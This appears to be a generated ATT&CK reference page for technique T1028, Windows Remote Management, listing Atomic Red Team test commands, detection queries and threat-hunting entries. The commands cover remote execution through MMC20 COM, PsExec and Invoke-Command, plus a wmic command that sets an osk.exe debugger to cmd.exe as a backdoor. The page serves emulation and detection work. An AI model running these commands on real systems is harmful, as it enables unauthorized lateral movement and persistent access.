
# Windows Remote Management

## Description

### MITRE Description

> Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). (Citation: Microsoft WinRM) It may be called with the <code>winrm</code> command or by any number of programs such as PowerShell. (Citation: Jacobsen 2014)

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: True
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1028

## Potential Commands

```
Enable-PSRemoting -Force

[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","computer1")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")

wmic /user:DOMAIN\Administrator /password:#{password} /node:#{computer_name} process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"

wmic /user:#{user_name} /password:P@ssw0rd1 /node:#{computer_name} process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"

wmic /user:#{user_name} /password:#{password} /node:Target process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"

#{psexec_exe} \\#{computer_name} -u DOMAIN\Administrator -p #{password} -s cmd.exe

#{psexec_exe} \\#{computer_name} -u #{user_name} -p P@ssw0rd1 -s cmd.exe

#{psexec_exe} \\localhost -u #{user_name} -p #{password} -s cmd.exe

C:\PSTools\PsExec.exe \\#{computer_name} -u #{user_name} -p #{password} -s cmd.exe

invoke-command -ComputerName localhost -scriptblock {#{remote_command}}

invoke-command -ComputerName #{host_name} -scriptblock {ipconfig}

powershell Enable-PSRemoting -Force
winrm.exe
```

## Commands Dataset

```
[{'command': 'Enable-PSRemoting -Force\n',
  'name': None,
  'source': 'atomics/T1028/T1028.yaml'},
 {'command': '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","computer1")).Document.ActiveView.ExecuteShellCommand("c:\\windows\\system32\\calc.exe", '
             '$null, $null, "7")\n',
  'name': None,
  'source': 'atomics/T1028/T1028.yaml'},
 {'command': 'wmic /user:DOMAIN\\Administrator /password:#{password} '
             '/node:#{computer_name} process call create '
             '"C:\\Windows\\system32\\reg.exe add '
             '\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\osk.exe\\" /v \\"Debugger\\" /t REG_SZ '
             '/d \\"cmd.exe\\" /f"\n',
  'name': None,
  'source': 'atomics/T1028/T1028.yaml'},
 {'command': 'wmic /user:#{user_name} /password:P@ssw0rd1 '
             '/node:#{computer_name} process call create '
             '"C:\\Windows\\system32\\reg.exe add '
             '\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\osk.exe\\" /v \\"Debugger\\" /t REG_SZ '
             '/d \\"cmd.exe\\" /f"\n',
  'name': None,
  'source': 'atomics/T1028/T1028.yaml'},
 {'command': 'wmic /user:#{user_name} /password:#{password} /node:Target '
             'process call create "C:\\Windows\\system32\\reg.exe add '
             '\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\osk.exe\\" /v \\"Debugger\\" /t REG_SZ '
             '/d \\"cmd.exe\\" /f"\n',
  'name': None,
  'source': 'atomics/T1028/T1028.yaml'},
 {'command': '#{psexec_exe} \\\\#{computer_name} -u DOMAIN\\Administrator -p '
             '#{password} -s cmd.exe\n',
  'name': None,
  'source': 'atomics/T1028/T1028.yaml'},
 {'command': '#{psexec_exe} \\\\#{computer_name} -u #{user_name} -p P@ssw0rd1 '
             '-s cmd.exe\n',
  'name': None,
  'source': 'atomics/T1028/T1028.yaml'},
 {'command': '#{psexec_exe} \\\\localhost -u #{user_name} -p #{password} -s '
             'cmd.exe\n',
  'name': None,
  'source': 'atomics/T1028/T1028.yaml'},
 {'command': 'C:\\PSTools\\PsExec.exe \\\\#{computer_name} -u #{user_name} -p '
             '#{password} -s cmd.exe\n',
  'name': None,
  'source': 'atomics/T1028/T1028.yaml'},
 {'command': 'invoke-command -ComputerName localhost -scriptblock '
             '{#{remote_command}}\n',
  'name': None,
  'source': 'atomics/T1028/T1028.yaml'},
 {'command': 'invoke-command -ComputerName #{host_name} -scriptblock '
             '{ipconfig}\n',
  'name': None,
  'source': 'atomics/T1028/T1028.yaml'},
 {'command': 'powershell Enable-PSRemoting -Force',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'winrm.exe',
  'name': None,
  'source': 'SysmonHunter - Windows Remote Management'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'Windows Remote Management',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_path contains '
           '"wsmprovhost.exe"or process_path contains "winrm.cmd")and '
           '(process_command_line contains "Enable-PSRemoting -Force"or '
           'process_command_line contains "Invoke-Command -computer_name"or '
           'process_command_line contains "wmic*node*process call create")'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: win_ remote powershell session\n'
           'description: windows server 2016\n'
           'tags: T1028\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: security\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection1:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4688 # have created a new '
           'process.\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Newprocessname: 'C: \\ Windows \\ "
           "System32 \\ dllhost.exe' # new process name\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Creatorprocessname: 'C: \\ Windows "
           "\\ System32 \\ svchost.exe' # creator process name\n"
           '\xa0\xa0\xa0\xa0selection2:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4688 # have created a new '
           'process.\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Newprocessname: 'C: \\ Windows \\ "
           "System32 \\ wsmprovhost.exe' # new process name\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Creatorprocessname: 'C: \\ Windows "
           "\\ System32 \\ svchost.exe' # creator process name\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Processcommandline: 'C: \\ Windows "
           "\\ system32 \\ wsmprovhost.exe -Embedding' # process command line "
           'arguments\n'
           '\xa0\xa0\xa0\xa0timeframe: last 2s\n'
           '\xa0\xa0\xa0\xa0condition: selection\n'
           'level: medium'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Windows Remote Management': {'atomic_tests': [{'description': 'Powershell '
                                                                                        'Enable '
                                                                                        'WinRM\n'
                                                                                        '\n'
                                                                                        'Upon '
                                                                                        'successful '
                                                                                        'execution, '
                                                                                        'powershell '
                                                                                        'will '
                                                                                        '"Enable-PSRemoting" '
                                                                                        'allowing '
                                                                                        'for '
                                                                                        'remote '
                                                                                        'PS '
                                                                                        'access.\n',
                                                                         'executor': {'command': 'Enable-PSRemoting '
                                                                                                 '-Force\n',
                                                                                      'elevation_required': True,
                                                                                      'name': 'powershell'},
                                                                         'name': 'Enable '
                                                                                 'Windows '
                                                                                 'Remote '
                                                                                 'Management',
                                                                         'supported_platforms': ['windows']},
                                                                        {'description': 'Powershell '
                                                                                        'lateral '
                                                                                        'movement '
                                                                                        'using '
                                                                                        'the '
                                                                                        'mmc20 '
                                                                                        'application '
                                                                                        'com '
                                                                                        'object.\n'
                                                                                        '\n'
                                                                                        'Reference:\n'
                                                                                        '\n'
                                                                                        'https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n'
                                                                                        '\n'
                                                                                        'Upon '
                                                                                        'successful '
                                                                                        'execution, '
                                                                                        'cmd '
                                                                                        'will '
                                                                                        'spawn '
                                                                                        'calc.exe '
                                                                                        'on '
                                                                                        'a '
                                                                                        'remote '
                                                                                        'computer.\n',
                                                                         'executor': {'command': '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\\windows\\system32\\calc.exe", '
                                                                                                 '$null, '
                                                                                                 '$null, '
                                                                                                 '"7")\n',
                                                                                      'name': 'powershell'},
                                                                         'input_arguments': {'computer_name': {'default': 'computer1',
                                                                                                               'description': 'Name '
                                                                                                                              'of '
                                                                                                                              'Computer',
                                                                                                               'type': 'string'}},
                                                                         'name': 'PowerShell '
                                                                                 'Lateral '
                                                                                 'Movement',
                                                                         'supported_platforms': ['windows']},
                                                                        {'description': 'Utilize '
                                                                                        'WMIC '
                                                                                        'to '
                                                                                        'start '
                                                                                        'remote '
                                                                                        'process.\n'
                                                                                        '\n'
                                                                                        'Upon '
                                                                                        'successful '
                                                                                        'execution, '
                                                                                        'cmd '
                                                                                        'will '
                                                                                        'utilize '
                                                                                        'wmic.exe '
                                                                                        'to '
                                                                                        'modify '
                                                                                        'the '
                                                                                        'registry '
                                                                                        'on '
                                                                                        'a '
                                                                                        'remote '
                                                                                        'endpoint '
                                                                                        'to '
                                                                                        'swap '
                                                                                        'osk.exe '
                                                                                        'with '
                                                                                        'cmd.exe.\n',
                                                                         'executor': {'command': 'wmic '
                                                                                                 '/user:#{user_name} '
                                                                                                 '/password:#{password} '
                                                                                                 '/node:#{computer_name} '
                                                                                                 'process '
                                                                                                 'call '
                                                                                                 'create '
                                                                                                 '"C:\\Windows\\system32\\reg.exe '
                                                                                                 'add '
                                                                                                 '\\"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                 'NT\\CurrentVersion\\Image '
                                                                                                 'File '
                                                                                                 'Execution '
                                                                                                 'Options\\osk.exe\\" '
                                                                                                 '/v '
                                                                                                 '\\"Debugger\\" '
                                                                                                 '/t '
                                                                                                 'REG_SZ '
                                                                                                 '/d '
                                                                                                 '\\"cmd.exe\\" '
                                                                                                 '/f"\n',
                                                                                      'name': 'command_prompt'},
                                                                         'input_arguments': {'computer_name': {'default': 'Target',
                                                                                                               'description': 'Target '
                                                                                                                              'Computer '
                                                                                                                              'Name',
                                                                                                               'type': 'String'},
                                                                                             'password': {'default': 'P@ssw0rd1',
                                                                                                          'description': 'Password',
                                                                                                          'type': 'String'},
                                                                                             'user_name': {'default': 'DOMAIN\\Administrator',
                                                                                                           'description': 'Username',
                                                                                                           'type': 'String'}},
                                                                         'name': 'WMIC '
                                                                                 'Process '
                                                                                 'Call '
                                                                                 'Create',
                                                                         'supported_platforms': ['windows']},
                                                                        {'dependencies': [{'description': 'PsExec '
                                                                                                          'tool '
                                                                                                          'from '
                                                                                                          'Sysinternals '
                                                                                                          'must '
                                                                                                          'exist '
                                                                                                          'on '
                                                                                                          'disk '
                                                                                                          'at '
                                                                                                          'specified '
                                                                                                          'location '
                                                                                                          '(#{psexec_exe})\n',
                                                                                           'get_prereq_command': 'Invoke-WebRequest '
                                                                                                                 '"https://download.sysinternals.com/files/PSTools.zip" '
                                                                                                                 '-OutFile '
                                                                                                                 '"$env:TEMP\\PsTools.zip"\n'
                                                                                                                 'Expand-Archive '
                                                                                                                 '$env:TEMP\\PsTools.zip '
                                                                                                                 '$env:TEMP\\PsTools '
                                                                                                                 '-Force\n'
                                                                                                                 'New-Item '
                                                                                                                 '-ItemType '
                                                                                                                 'Directory '
                                                                                                                 '("#{psexec_exe}") '
                                                                                                                 '-Force '
                                                                                                                 '| '
                                                                                                                 'Out-Null\n'
                                                                                                                 'Copy-Item '
                                                                                                                 '$env:TEMP\\PsTools\\PsExec.exe '
                                                                                                                 '"#{psexec_exe}" '
                                                                                                                 '-Force\n',
                                                                                           'prereq_command': 'if '
                                                                                                             '(Test-Path '
                                                                                                             '"#{psexec_exe}"") '
                                                                                                             '{ '
                                                                                                             'exit '
                                                                                                             '0} '
                                                                                                             'else '
                                                                                                             '{ '
                                                                                                             'exit '
                                                                                                             '1}\n'}],
                                                                         'description': 'Utilize '
                                                                                        'psexec '
                                                                                        'to '
                                                                                        'start '
                                                                                        'remote '
                                                                                        'process.\n'
                                                                                        '\n'
                                                                                        'Upon '
                                                                                        'successful '
                                                                                        'execution, '
                                                                                        'cmd '
                                                                                        'will '
                                                                                        'utilize '
                                                                                        'psexec.exe '
                                                                                        'to '
                                                                                        'spawn '
                                                                                        'cmd.exe '
                                                                                        'on '
                                                                                        'a '
                                                                                        'remote '
                                                                                        'system.\n',
                                                                         'executor': {'command': '#{psexec_exe} '
                                                                                                 '\\\\#{computer_name} '
                                                                                                 '-u '
                                                                                                 '#{user_name} '
                                                                                                 '-p '
                                                                                                 '#{password} '
                                                                                                 '-s '
                                                                                                 'cmd.exe\n',
                                                                                      'name': 'command_prompt'},
                                                                         'input_arguments': {'computer_name': {'default': 'localhost',
                                                                                                               'description': 'Target '
                                                                                                                              'Computer '
                                                                                                                              'Name',
                                                                                                               'type': 'String'},
                                                                                             'password': {'default': 'P@ssw0rd1',
                                                                                                          'description': 'Password',
                                                                                                          'type': 'String'},
                                                                                             'psexec_exe': {'default': 'C:\\PSTools\\PsExec.exe',
                                                                                                            'description': 'Path '
                                                                                                                           'to '
                                                                                                                           'PsExec',
                                                                                                            'type': 'string'},
                                                                                             'user_name': {'default': 'DOMAIN\\Administrator',
                                                                                                           'description': 'Username',
                                                                                                           'type': 'String'}},
                                                                         'name': 'Psexec',
                                                                         'supported_platforms': ['windows']},
                                                                        {'description': 'Execute '
                                                                                        'Invoke-command '
                                                                                        'on '
                                                                                        'remote '
                                                                                        'host.\n'
                                                                                        '\n'
                                                                                        'Upon '
                                                                                        'successful '
                                                                                        'execution, '
                                                                                        'powershell '
                                                                                        'will '
                                                                                        'execute '
                                                                                        'ipconfig '
                                                                                        'on '
                                                                                        'localhost '
                                                                                        'using '
                                                                                        '`invoke-command`.\n',
                                                                         'executor': {'command': 'invoke-command '
                                                                                                 '-ComputerName '
                                                                                                 '#{host_name} '
                                                                                                 '-scriptblock '
                                                                                                 '{#{remote_command}}\n',
                                                                                      'name': 'powershell'},
                                                                         'input_arguments': {'host_name': {'default': 'localhost',
                                                                                                           'description': 'Remote '
                                                                                                                          'Windows '
                                                                                                                          'Host '
                                                                                                                          'Name',
                                                                                                           'type': 'String'},
                                                                                             'remote_command': {'default': 'ipconfig',
                                                                                                                'description': 'Command '
                                                                                                                               'to '
                                                                                                                               'execute '
                                                                                                                               'on '
                                                                                                                               'remote '
                                                                                                                               'Host',
                                                                                                                'type': 'String'}},
                                                                         'name': 'Invoke-Command',
                                                                         'supported_platforms': ['windows']}],
                                                       'attack_technique': 'T1028',
                                                       'display_name': 'Windows '
                                                                       'Remote '
                                                                       'Management'}},
 {'Threat Hunting Tables': {'chain_id': '100174',
                            'commandline_string': 'Enable-PSRemoting -Force',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'high',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1028',
                            'mitre_caption': 'remote_execution',
                            'os': 'windows',
                            'parent_process': 'powershell',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'SysmonHunter - T1028': {'description': None,
                           'level': 'medium',
                           'name': 'Windows Remote Management',
                           'phase': 'Execution, Lateral Movement',
                           'query': [{'process': {'any': {'pattern': 'winrm.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Execution](../tactics/Execution.md)

* [Lateral Movement](../tactics/Lateral-Movement.md)
    

# Mitigations

None

# Actors


* [Threat Group-3390](../actors/Threat-Group-3390.md)

